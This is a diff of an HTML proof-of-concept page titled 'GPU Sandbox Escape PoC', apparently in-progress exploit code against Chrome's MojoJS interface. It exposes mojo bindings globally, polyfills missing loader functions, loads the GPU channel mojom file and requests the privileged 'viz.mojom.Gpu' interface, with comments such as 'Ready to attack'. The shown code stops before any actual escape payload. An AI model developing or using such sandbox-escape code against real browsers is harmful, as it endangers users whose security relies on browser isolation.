@@ -4,17 +4,18 @@
     <title>GPU Sandbox Escape PoC</title>
 </head>
 <body>
-    <h1>MojoJS ES6 Module Loader</h1>
+    <h1>MojoJS ES6 Module Loader1</h1>
     <canvas id="target-canvas" width="10" height="10"></canvas>
     
-    <script type="module">
+<script type="module">
         import { mojo } from './gen/mojo/public/js/bindings.js';
         
-        // 1. Expose mojo globally
         window.mojo = mojo;
-        console.log("[+] mojo namespace exposed globally");
-
-        // 2. Polyfill the missing legacy functions so gpu_channel.mojom.js doesn't crash
+        
+        // --- NEW FIX: Add the config object ---
+        window.mojo.config = { autoLoadMojomDeps: false };
+        
+        // Polyfill the missing legacy functions
         window.mojo.internal.isMojomLoaded = function(id) { return false; };
         window.mojo.internal.markMojomLoaded = function(id) {};
         window.mojo.internal.loadMojomIfNecessary = function(path, file) {
@@ -30,33 +31,35 @@
             return parent;
         };
 
-        // 3. Now dynamically load gpu_channel.mojom.js
         const script = document.createElement('script');
         script.src = './gen/gpu/ipc/common/gpu_channel.mojom.js';
         
         script.onload = () => {
             console.log("[+] gpu_channel.mojom.js loaded successfully!");
             console.log("[+] gpu.mojom namespace available: ", window.gpu.mojom);
-            startExploit();
+            
+            // If the namespace is populated, we can start the offensive exploit!
+            if (window.gpu.mojom.GpuChannelProxy) {
+                console.log("[+] GpuChannelProxy found! Ready to attack.");
+                triggerOffensiveExploit();
+            }
         };
         document.head.appendChild(script);
 
-        // 4. Our Exploit setup
-        function startExploit() {
-            // Hook the bindInterface function to watch what Chrome requests
-            const original_bind = window.Mojo.bindInterface;
-            window.Mojo.bindInterface = function(interfaceName, pipe, host) {
-                console.log("[*] Intercepted Mojo Interface Request: " + interfaceName);
-                return original_bind(interfaceName, pipe, host);
-            };
-
-            // Trigger the canvas to force Chrome to set up the GPU Command Buffer
-            setTimeout(() => {
-                console.log("[*] Initializing Canvas to trigger IPC...");
-                const canvas = document.getElementById('target-canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.fillRect(0, 0, 10, 10);
-            }, 500);
+        function triggerOffensiveExploit() {
+            console.log("[!] Initiating Active GPU Channel Request...");
+            
+            // Instead of waiting for a canvas, we ask Chrome's BrowserInterfaceBroker 
+            // for direct access to the GPU service (viz.mojom.Gpu)
+            
+            let {handle0, handle1} = Mojo.createMessagePipe();
+            
+            // We request the 'viz.mojom.Gpu' interface. 
+            // This is the highly privileged interface that creates GPU Channels.
+            Mojo.bindInterface('viz.mojom.Gpu', handle0, "context");
+            
+            console.log("[+] Sent request for viz.mojom.Gpu");
+            console.log("[?] To proceed, we need to send the 'EstablishGpuChannel' message.");
         }
     </script>
 </body>
